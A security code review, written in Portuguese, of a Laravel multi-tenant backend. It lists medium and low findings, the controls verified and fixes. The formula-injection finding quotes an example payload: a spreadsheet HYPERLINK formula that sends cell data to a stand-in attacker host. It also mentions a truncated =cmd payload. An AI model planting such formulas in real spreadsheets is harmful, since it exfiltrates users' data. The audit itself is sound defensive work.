# Review de Segurança — Backend SIGAPP

**Data:** 10/06/2026
**Escopo:** Backend Laravel 13 (multi-tenant — stancl/tenancy, Sanctum, Cashier/Stripe, Spatie Permission, módulo de IA)
**Método:** Revisão manual de código — rotas, middlewares, autenticação, autorização, webhooks, uploads/parsers, exports, SQL raw, configurações e segredos.

---

## Resumo executivo

A postura geral de segurança do backend é **boa**. Os fluxos críticos (webhook Stripe, broker de login central, isolamento de tenant, autorização por policy/permission gate, uploads) estão bem implementados, com várias proteções acima da média. Não foi encontrada nenhuma vulnerabilidade crítica explorável remotamente.

Foram identificados **2 achados de severidade média** e um conjunto de itens de baixa severidade/hardening.

| Severidade | Qtde | Achados |
|---|---|---|
| Crítica | 0 | — |
| Alta | 0 | — |
| Média | 2 | Injeção de fórmula no export Excel; `is_admin` mass assignable no User central |
| Baixa | 6 | CORS `*.localhost` em produção; consent-log sobrescrevível; cookie de sessão sem `secure` forçado; zip bomb no KMZ; broker session sem vínculo de IP; senha de admin central via `.env` |

---

## Achados

### M1 — Injeção de fórmula no export Excel (Formula/CSV Injection) — **MÉDIA**

**Arquivo:** `app/Exports/Tenant/TerrenosExport.php` (método `map()`)

Campos controlados pelo usuário (`nome` do terreno, nome do responsável, etc.) são exportados para `.xlsx` sem sanitização. Um usuário do tenant pode cadastrar um terreno com nome iniciando em `=`, `+`, `-` ou `@` (ex.: `=HYPERLINK("http://evil.tld?x="&A1;"clique")` ou `=cmd|...`), que será interpretado como fórmula quando outro usuário abrir a planilha.

**Recomendação:** registrar um value binder que force células de texto a string explícita, por exemplo:

```php
// Em AppServiceProvider::boot() ou no próprio export
\PhpOffice\PhpSpreadsheet\Cell\Cell::setValueBinder(
    new \PhpOffice\PhpSpreadsheet\Cell\StringValueBinder()
);
```

ou prefixar com `'` valores que iniciem com `=`, `+`, `-`, `@`, `\t`, `\r`.

### M2 — `is_admin` mass assignable no modelo `User` central — **MÉDIA (defesa em profundidade)**

**Arquivo:** `app/Models/User.php`

```php
#[Fillable(['name', 'email', 'password', 'is_admin'])]
```

`is_admin` é o flag de privilégio máximo da aplicação (controla acesso ao painel central, Telescope, etc.). Hoje os únicos caminhos de escrita passam por `Admin/UserController` (já protegido por `central.admin`), então **não há exploração direta**. Porém, qualquer endpoint futuro que faça `User::create($request->validated())` ou `$user->fill(...)` com dados de request herda risco de escalação de privilégio.

**Recomendação:** remover `is_admin` do `#[Fillable]` e atribuí-lo explicitamente (`$user->is_admin = ...`) apenas no service administrativo.

### B1 — CORS permite `*.localhost` incondicionalmente — **BAIXA**

**Arquivo:** `config/cors.php`

O padrão `/https?:\/\/(.+)?\.localhost(:\d+)?$/` está sempre presente em `allowed_origins_patterns`, inclusive em produção, com `supports_credentials => true`. Além disso, o padrão do domínio da aplicação aceita `http://` (não força HTTPS). Como a autenticação é por Bearer token (não cookie), o impacto prático é reduzido, mas é superfície desnecessária.

**Recomendação:** incluir o padrão `localhost` apenas quando `app()->environment('local', 'testing')` e restringir o padrão de produção a `https`.

### B2 — Registro de consentimento (LGPD) pode ser sobrescrito — **BAIXA**

**Arquivo:** `app/Http/Controllers/Api/V1/ConsentLogController.php`

O endpoint público usa `updateOrCreate` chaveado por `consent_id` fornecido pelo cliente. Quem conhecer (ou adivinhar) um `consent_id` pode sobrescrever o registro de consentimento de outra pessoa, comprometendo a integridade da trilha de accountability LGPD. O rate limit (5/min/IP) mitiga abuso em massa.

**Recomendação:** tornar o log append-only (criar nova linha versionada por `consent_id` em vez de atualizar), preservando o histórico.

### B3 — Cookie de sessão sem `secure` garantido — **BAIXA**

**Arquivo:** `config/session.php`

`'secure' => env('SESSION_SECURE_COOKIE')` sem default `true` em produção. A API é majoritariamente token-based (impacto baixo), mas as rotas web (Cashier payment page, Telescope) usam sessão.

**Recomendação:** definir `SESSION_SECURE_COOKIE=true` no ambiente de produção (ou default `app()->isProduction()`).

### B4 — Possível zip bomb no import KMZ — **BAIXA (DoS)**

**Arquivo:** `app/Services/Tenant/KmzParserService.php`

O upload é limitado a 3 MB, mas `$zip->getFromIndex($i)` carrega o KML descomprimido inteiro em memória — um KMZ de 3 MB pode expandir para centenas de MB/GB.

**Recomendação:** verificar `$zip->statIndex($i)['size']` antes de extrair e rejeitar acima de um teto (ex.: 20 MB).

### B5 — Sessão do broker de login sem vínculo de origem — **BAIXA**

**Arquivo:** `app/Services/Auth/CentralLoginBrokerService.php`

`selectTenant` aceita apenas o `broker_session_id` (UUID v4, TTL 5 min, single-use) como credencial, sem validar IP/User-Agent contra os armazenados na sessão. A entropia do UUID torna brute force inviável (e há throttle de 10/min/IP), mas o vínculo de origem custaria pouco.

**Recomendação (hardening):** comparar `ip_address` da sessão com o IP da requisição em `selectTenant`.

### B6 — Senha do admin central provisionada via `.env` — **BAIXA (operacional)**

`CENTRAL_ADMIN_PASSWORD` no `.env` alimenta o seeder do administrador central. Garantir senha forte/única por ambiente, restringir leitura do `.env` no servidor e rotacionar após o primeiro login.

---

## Pontos positivos verificados

**Autenticação e sessão**
- Broker de login central com tickets de transferência de **uso único**, armazenados como hash SHA-256, TTL de 90s e resgate atômico (`UPDATE ... WHERE used_at IS NULL`) com revogação do token em caso de corrida (`CentralLoginBrokerService`).
- Tokens Sanctum com expiração; `refresh` revoga o token anterior; `logout-all` disponível.
- Rate limiting granular e bem pensado: login 5/min por IP+hash(email), reset de senha, exchange-ticket, signup-status, aprovações — todos com chaves específicas por tenant/IP/usuário.
- Reset de senha usa o broker nativo do Laravel (tokens hasheados, expiração padrão) por tenant.

**Autorização e isolamento multi-tenant**
- Todos os modelos do tenant cobertos por `TenantPolicy` registrada centralmente; FormRequests fazem `authorize()` via policy (verificado em Documentos, Terrenos).
- `PermissionGate` mapeia método HTTP → nível mínimo (GET=viewer, POST/PUT=editor, DELETE=manager).
- Admin central exige tripla checagem: `is_admin` + ability `admin` no token + contexto não-tenant (`EnsureUserIsAdmin`).
- Header `X-Tenant` só é aceito em `local/testing/development`, com validação por regex (`InitializeTenancyFlexible`).
- Storage por tenant isolado (`suffix_storage_path => true`).

**Webhook Stripe** (`WebhookController`)
- Assinatura obrigatória fora de `local/testing`; retorna 503 se o secret estiver ausente (fail-closed).
- Idempotência por `event_id` com `Cache::lock` + marcação `processed_at`.
- Validação de vínculo do checkout (session ID armazenado, `client_reference_id`, `customer` mismatch) antes de provisionar tenant.

**Entrada de dados**
- SQL raw inspecionado: todo uso de `whereRaw`/`selectRaw` é parametrizado ou estático; `date_field` do export é whitelisted via regra `in:`.
- Upload de documentos: whitelist de extensão + MIME por conteúdo (`guessExtension`), nome de arquivo aleatório (UUID), 3 MB máx., disco privado (`local`).
- KMZ: extração em memória (sem `extractTo` → sem zip slip); `simplexml_load_string` sem `LIBXML_NOENT` (XXE mitigado no libxml ≥ 2.9 / PHP 8.4).
- Templates Blade dos PDFs (Browsershot) usam apenas `{{ }}` (escapado); nenhum `{!! !!}` fora dos templates de e-mail do vendor.

**Exposição de ferramentas e segredos**
- Telescope: gate `viewTelescope` restrito a `is_admin`; headers sensíveis ocultados fora de local.
- Scramble (`/docs/api`): `RestrictedDocsAccess` + gate `viewApiDocs` restrito a ambiente local.
- `.env` fora do git (`.gitignore` cobre `.env*`); nenhum segredo encontrado em arquivos versionados; `.env.example` sem valores reais.
- `password` com cast `hashed` e `#[Hidden]` em ambos os modelos User.
- Health check público minimalista; health detalhado exige autenticação (inclusive no tenant).

**LGPD/Privacidade**
- IP armazenado apenas como hash SHA-256 no consent-log.
- `AiDataRedactor` remove CPF/CNPJ/e-mail/telefone antes de enviar conteúdo ao LLM.

---

## Recomendações priorizadas

1. **Corrigir M1** (formula injection no Excel) — correção pequena e de alto valor, dado que planilhas são compartilhadas entre usuários.
2. **Corrigir M2** (`is_admin` fora do Fillable) — uma linha, elimina classe inteira de risco futuro.
3. Aplicar os hardenings B1–B5 conforme conveniência (todos de baixo esforço).
4. Processo: manter `composer audit` no CI para alertar CVEs de dependências (Cashier, tenancy, browsershot/puppeteer).
